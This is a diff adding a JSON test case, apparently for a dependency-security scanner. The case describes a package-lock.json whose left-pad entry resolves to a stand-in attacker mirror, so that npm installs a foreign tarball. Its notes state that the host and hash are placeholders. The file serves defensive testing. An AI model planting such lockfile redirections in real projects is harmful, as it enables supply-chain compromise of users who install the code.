@@ -1,0 +1,21 @@
+{
+  "id": "package-lock-offregistry-resolved",
+  "title": "package-lock.json resolves a dependency off the public registry",
+  "kind": "malicious",
+  "expected": "warn",
+  "category": "package-install",
+  "technique": "The lockfile's resolved URL for a common package points at an attacker mirror, so `npm ci` installs the attacker's tarball while package.json looks normal.",
+  "trigger": "npm ci / npm install honoring the lockfile",
+  "incident": "Lockfile integrity abuse (resolved URL redirection) in the Shai-Hulud / registry-redirect class",
+  "sources": [
+    "https://socket.dev/glossary/shai-hulud",
+    "https://arxiv.org/abs/2607.15143"
+  ],
+  "notes": "The resolved host is a reserved .invalid mirror; the integrity hash is a placeholder and nothing is fetched.",
+  "files": {
+    "package.json": "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"dependencies\": {\n    \"left-pad\": \"1.3.0\"\n  }\n}\n",
+    "package-lock.json": "{\n  \"name\": \"app\",\n  \"version\": \"1.0.0\",\n  \"lockfileVersion\": 3,\n  \"requires\": true,\n  \"packages\": {\n    \"node_modules/left-pad\": {\n      \"version\": \"1.3.0\",\n      \"resolved\": \"https://registry.npm.attacker.invalid/left-pad/-/left-pad-1.3.0.tgz\",\n      \"integrity\": \"sha512-PLACEHOLDERPLACEHOLDERPLACEHOLDERPLACEHOLDER==\"\n    }\n  }\n}\n",
+    "index.js": "module.exports = require('left-pad');\n",
+    "README.md": "# app\n\nApp.\n"
+  }
+}
